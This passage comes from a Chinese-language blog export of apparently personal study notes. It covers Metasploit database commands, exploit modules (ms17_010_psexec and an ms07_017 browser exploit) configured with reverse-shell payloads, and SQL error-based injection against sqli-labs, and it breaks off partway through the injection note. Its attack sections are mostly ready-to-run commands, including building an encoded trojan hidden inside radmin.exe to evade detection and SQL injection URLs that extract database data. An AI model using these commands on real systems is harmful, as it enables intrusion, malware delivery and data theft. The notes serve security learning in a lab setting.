<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163842413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后重启一下msf就可以了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164200944.png" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164225902.png" alt="在这里插入图片描述"></p>
<h1 id="开始正式的笔记"><a href="#开始正式的笔记" class="headerlink" title="开始正式的笔记"></a>开始正式的笔记</h1><h3 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h3><ol>
<li>db命令介绍<br>db按Tab键查看<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164916507.png" alt="在这里插入图片描述"></li>
<li><strong>db_status</strong>：查看是否连接到数据库</li>
<li><strong>db_disconnect</strong>：断开连接数据库</li>
<li><strong>db_connect</strong>：连接，可以用-h命令查看使用<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409170622902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li><strong>db_nmap</strong>：这个和在命令行nmap一样，这个就是扫描的结果会保持到数据库里面<br>扫描一下<code>db_nmap 192.168.0.1</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409171244194.png" alt="在这里插入图片描述"></li>
</ol>
<p><strong>4.1</strong> 用<code>hosts</code>命令查看存储的IP，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409171827349.png" alt="在这里插入图片描述"><br>只指定要查看的目标可以这样<code>hosts   目标IP</code><br><code>hosts</code> 的-S参数要只查看带目标带什么特征字的，比如列搜索带.0.的<code>hosts  -S .0.</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409172509644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以用<code>-h</code>查看使用参数<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409172718175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.2</strong> 查看扫描查看的IP命令<code>services</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020040917280366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>services</code>这个命令也可以过滤和<code>hosts</code> 差不多<br><strong>列只查看开80的</strong><br><code>services -p 80</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409173038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>services</code>也可以用<code>-h</code>查看他的参数<br><code>services -h</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409173209556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. 数据库导入导出<br><strong>导出命令<code>db_export</code></strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_export -f  指定的文件格式   文件名</span><br></pre></td></tr></table></figure>

列
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_export -f  xml  &#x2F;root&#x2F;msfbak.xml</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412185035426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>导入命令<code>db_import</code></strong><br>    使用</p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_import   要导入的文件</span><br></pre></td></tr></table></figure></code></pre>
<h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><p>上面都是关于数据库的命令</p>
<ol>
<li>执行命令<code>run</code>和<code>exploit</code>命令**<br> run和exploit差不多<br> 1.1run就不用说了都知道<br> 1.2<code>exploit</code>命令加上-h隐藏连接<br>发现没有连接shell<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041220440751.png" alt="在这里插入图片描述"><br> <code>sessions -l</code>用这个命令就可以查看有多少已经成功拿到shell的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412204830249.png" alt="在这里插入图片描述"><br> 进入shell用这个命令<code>sessions -i  要进入的id名</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412205004728.png" alt="在这里插入图片描述"></li>
</ol>
<ol start="2">
<li>设置模块的参数<br><code>set</code>设置模块的参数<br><code>unset</code>清除设置模块的参数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset   要取消的参数名字</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412190012718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>setg</code>设置全局模块的参数<br><code>unsetg</code> 清除全局设置</p>
<h2 id="调用插件"><a href="#调用插件" class="headerlink" title="调用插件"></a>调用插件</h2><ol>
<li><p>导入<br><code>load</code>命令<br>输入完这个命令可以按Tab键查看可以使用的插件<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041419353480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>叫<code>openvas</code>模块给导入进来<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load openvas</span><br></pre></td></tr></table></figure>
<p>他这个只是连接openvas这个工具，都是这个openvas还是要下载好才能连接的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200415212807743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有很多这个就不演示一个一个导入模块了</p>
</li>
<li><p>导入完成后取消掉</p>
</li>
</ol>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unload openvas</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200415213228796.png" alt="在这里插入图片描述"><br>3. 导入自己的模块<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loadpath  要导入文件的路径</span><br></pre></td></tr></table></figure>


<h2 id="命令路由流量"><a href="#命令路由流量" class="headerlink" title="命令路由流量"></a>命令路由流量</h2><p><code>route</code>  指定session添加路由流量，这样就可以我不能访问的地方通过路由流量就是比如拿到的shell访问<br>这个就不演示了，在百度上搜索<strong>Metasploit  route</strong>就能找到</p>
<h2 id="做编程开发的工作"><a href="#做编程开发的工作" class="headerlink" title="做编程开发的工作"></a>做编程开发的工作</h2><p><code>puts</code>命令这个在后面在说</p>
<h2 id="导入资源文件"><a href="#导入资源文件" class="headerlink" title="导入资源文件"></a>导入资源文件</h2><p><code>resource</code>命令和<code>-r</code>参数</p>
<ol>
<li>resource命令<br>这个命令就是叫配置好的文件直接运行到要指定的模块</li>
</ol>
<p><strong>列文件内容</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083418952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource  要导入的文件.rc</span><br></pre></td></tr></table></figure>
<p>可以看到他就自己用文件的内容进行配置了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083509739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. -r参数<br>如果没有进入msf命令台里面<br>我们就可以启动msf时加上-r参数<br>列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole -r 要指定的文件</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083834689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Metasploit之Exploit模块</title>
    <url>/2020/08/29/4.%20Metasploit%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="再学Metasploit"><a href="#再学Metasploit" class="headerlink" title="再学Metasploit"></a>再学Metasploit</h2><h2 id="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"><a href="#之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来" class="headerlink" title="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"></a>之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来</h2><h2 id="1-Active-Exploit-主动的"><a href="#1-Active-Exploit-主动的" class="headerlink" title="1. Active Exploit 主动的"></a>1. Active Exploit 主动的</h2><ul>
<li>某种服务器开放的端口，攻击者主动发起漏洞利用代码，比如反弹shell代码执行，拿到目标shell</li>
<li>主动的就是主动发起漏洞利用代码</li>
</ul>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set RHOST 192.168.1.100						&#x2F;&#x2F;目标ip</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp     &#x2F;&#x2F;一个反弹的shell</span><br><span class="line">set LHOST 192.168.1.1						&#x2F;&#x2F;要反弹的那个ip</span><br><span class="line">set LPORT 4444			</span><br><span class="line">set SMBUSER 系统用户名</span><br><span class="line">set SMBPASS 系统密码</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417180810219.png" alt="在这里插入图片描述"></p>
<h2 id="2-Passive-Exploit被动的"><a href="#2-Passive-Exploit被动的" class="headerlink" title="2. Passive Exploit被动的"></a>2. Passive Exploit被动的</h2><ul>
<li>被攻击者是不存在漏洞的，漏洞存在客户端软件上，客户端访问远程服务器端的服务，服务器端存在漏洞利用代码，客户端程序存在漏洞，造成客户端漏洞被利用</li>
</ul>
<ol>
<li>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms07_017_ani_loadimage_chunksize</span><br><span class="line">set SRVHOST 192.168.0.109						&#x2F;&#x2F;自己的ip</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp		 &#x2F;&#x2F;目标访问我的web一个反弹的shell</span><br><span class="line">set LHOST 192.168.1.1						&#x2F;&#x2F;要反弹的那个ip</span><br><span class="line">set PORT 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p>启动<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041718505522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标访问漏洞就触发了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417185122218.png" alt="在这里插入图片描述"><br>看到有一个shell连接上来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041718531363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417185901367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>5. Metasploit之生成木马</title>
    <url>/2020/08/29/5.%20Metasploit%E4%B9%8B%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="再学Metasploit"><a href="#再学Metasploit" class="headerlink" title="再学Metasploit"></a>再学Metasploit</h2><h2 id="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"><a href="#之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来" class="headerlink" title="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"></a>之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来</h2><h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><p>exploit是指利用漏洞的一个过程，最终的目的是为了执行payloads<br>即使我们不使用payload直接发给目标进行执行也是可以实现执行payloads</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>查看payloads</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041814491566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="2">
<li><code>use payload/windows/shell_bind_tcp</code>就拿个模块演示<br>客户端运行 payloads就在本地监听端口叫攻击者去连接拿到shell<br>下面就是他默认的配置，我们不需要修改<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418145231882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就可以生成<strong>payloads</strong>了<br>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate</span><br></pre></td></tr></table></figure>
<p>下面生成的是ruby的16进行的payloads<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418150122745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3. 生成出来的ruby的16进行的payloads里面可能有坏字符，导致程序不能执行<br>长被称为坏字符\x00<br>过滤坏字符的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -b &quot;要过滤的字符&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到没有了<br><strong>发现文件变大了是应为编码后有可能1个字节变成2个字节了</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151117255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现他使用了encoder<br>他是默认去选择优秀的encoder<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151412150.png" alt="在这里插入图片描述"><br>4. 选择<strong>encoders</strong><br>查看有什么encoder<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show encoders</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151828449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>手动指定encoder</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -e x86&#x2F;nonalpha</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418152436484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. 生成payload<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -b &#39;\x00&#39; -f exe -e x86&#x2F;shikata_ga_nai -i 5 -k -x &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;radmin.exe -o &#x2F;1.exe</span><br></pre></td></tr></table></figure>
<p>-b 指定要踢出的坏字符<br>-f 指定输出的格式<br>-e指定的encoders<br>-i 加密次数<br>-k 运行中不会产生新的进程<br>-x 要借宿到哪个程序上<br>-o  要生成的文件<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418153811326.png" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041815394340.png" alt="在这里插入图片描述"></p>
<h2 id="被攻击端启动生成的1-exe"><a href="#被攻击端启动生成的1-exe" class="headerlink" title="被攻击端启动生成的1.exe"></a>被攻击端启动生成的1.exe</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154310859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实已经执行了木马病毒<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154418806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="kali的nc连接目标4444端口"><a href="#kali的nc连接目标4444端口" class="headerlink" title="kali的nc连接目标4444端口"></a>kali的nc连接目标4444端口</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154611773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="其他补充NOP"><a href="#其他补充NOP" class="headerlink" title="其他补充NOP"></a>其他补充NOP</h2><p>NOP叫做no-operation 或 next operation<br>如果我们就像缓冲区溢出里面的能控制EIP寄存器（存储下一跳的CPU要执行的内存地址）的话，如果EIP寄存器（存储下一跳的CPU要执行的内存地址）不能准确到跳到准确的内存地址我们就可以用不NOP会执行而是往后滑，从而执行到要执行的部分<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -P 要滑的长度</span><br></pre></td></tr></table></figure>



<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>3. 网易web安全渗透，sql注入之报错注入</title>
    <url>/2020/08/29/3.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="报错注入漏洞原理和应用"><a href="#报错注入漏洞原理和应用" class="headerlink" title="报错注入漏洞原理和应用"></a>报错注入漏洞原理和应用</h2><ul>
<li>构造 payload(有效载荷)让信息通过错误提示回显出来<ul>
<li>适合应用场景:<br>进行注入查询不回现内容,会打印sql错误信息<br>Update、 insert等语句,会打印错误信息</li>
</ul>
</li>
</ul>
<p><strong>查看一下下面的代码</strong><br>可以看到</p>
<ol>
<li><p>sql执行对了就打印出谢谢</p>
</li>
<li><p>sql执行错了就打印出sql的报错的信息</p>
<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200801181137465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ol>
<p>原理图<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200801181621183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="报错注入方法"><a href="#报错注入方法" class="headerlink" title="报错注入方法"></a>报错注入方法</h2><p>凡是可以让错误信息显示的函数(语句)，都能实现报错注入，这里我们列举3种，还有其他的</p>
<h3 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor()函数报错注入"></a>floor()函数报错注入</h3><p>下面使用的是users数据库<br>sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>  <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>((<span class="keyword">select</span> 要执行的<span class="keyword">sql</span>语句),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080313573774.png" alt="在这里插入图片描述"><br><strong>上面代码分析</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">floor()是取整数</span><br><span class="line">rand()在0和1之间产生一个随机数</span><br><span class="line">rand(0)*2将取0到2的随机数</span><br><span class="line">floor(rand()*2)有两条记录就会报错</span><br><span class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</span><br><span class="line">count(*)是用来统计结果的，相当于刷新一次结果</span><br><span class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</span><br><span class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</span><br></pre></td></tr></table></figure>
<p>在这张虚拟表中，group by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<p><strong>上面的代码介绍</strong></p>
<ol>
<li><p><code>count(*)</code>        函数就进行读取数据库的数据有多少行<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803140156558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p><code>group by</code>   函数是用来排序的</p>
<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803144300652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p><code>concat()</code> 函数是叫字符连接起来<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803151038546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>rand()和floor()函数<br> rand()生成随机数<br> 上面的rand(0)*2的意思就是产生0或1的随机数<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803151938224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> floor()函数<br> 就是省略小数点后面的<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803162446604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="sqli-labs第5关实战"><a href="#sqli-labs第5关实战" class="headerlink" title="sqli-labs第5关实战"></a>sqli-labs第5关实战</h4><p>URL输入<code>http://192.168.0.104/Less-5/?id=1</code><br>发现显示一个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803171208967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>URL输入<code>http://192.168.0.104/Less-5/?id=1 &#39; and 1=2  --+</code><br>就不显示了</p>
</li>
</ol>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803171400485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>上面这个就可以报错注入了</strong></p>
<ol>
<li><p>读取数据<br>URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select count(*) from users  group by concat((select user()),floor(rand(0)*2)))  --+</code> </p>
